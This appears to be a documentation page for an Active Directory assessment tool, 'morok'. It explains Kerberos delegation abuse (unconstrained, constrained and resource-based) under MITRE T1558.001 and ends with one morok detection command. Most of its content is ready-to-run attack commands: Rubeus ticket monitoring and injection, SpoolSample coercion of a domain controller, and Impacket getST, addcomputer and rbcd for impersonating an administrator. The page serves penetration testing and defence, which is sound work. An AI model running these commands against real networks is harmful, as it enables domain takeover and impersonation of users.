# Delegation Abuse

**MITRE:** T1558.001

## Unconstrained delegation

The account caches the full TGT of any user who authenticates to it. If the attacker compromises this account, they can extract all cached TGTs and impersonate those users.

**Trigger techniques:** SpoolSample (PrinterBug), PetitPotam — force a DC to authenticate to the compromised host, capture DC's TGT.

```bash
# Monitor for incoming TGTs (Rubeus)
Rubeus.exe monitor /interval:5 /filteruser:DC$

# Force DC to authenticate (SpoolSample)
SpoolSample.exe <DC> <compromised_host>

# Use captured TGT
Rubeus.exe ptt /ticket:<base64>
```

## Constrained delegation

The account can only delegate to specific SPNs. Still dangerous if the target includes LDAP, CIFS, or HOST — these allow full domain compromise via S4U2Self + S4U2Proxy.

Protocol Transition (`msDS-TrustedToAuthForDelegation`) is especially dangerous — allows impersonating any user without their password.

```bash
getST.py -spn cifs/dc01.corp.local -impersonate administrator \
  'corp.local/svc_account:Pass'
```

## Resource-Based Constrained Delegation (RBCD)

The target resource controls who can delegate to it via `msDS-AllowedToActOnBehalfOfOtherIdentity`. If an attacker can write this attribute on any computer account, they can add their own machine and impersonate any user.

```bash
# Add machine account
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Pass123' \
  'corp.local/lowpriv:Pass'

# Set RBCD
rbcd.py -delegate-from 'EVIL$' -delegate-to 'target$' \
  -action write 'corp.local/lowpriv:Pass'

# Get service ticket as administrator
getST.py -spn cifs/target.corp.local -impersonate administrator \
  'corp.local/EVIL$:Pass123'
```

## Detection with morok

```bash
morok delegation -d corp.local -u jdoe -p 'Password1' --dc 10.0.0.1
```
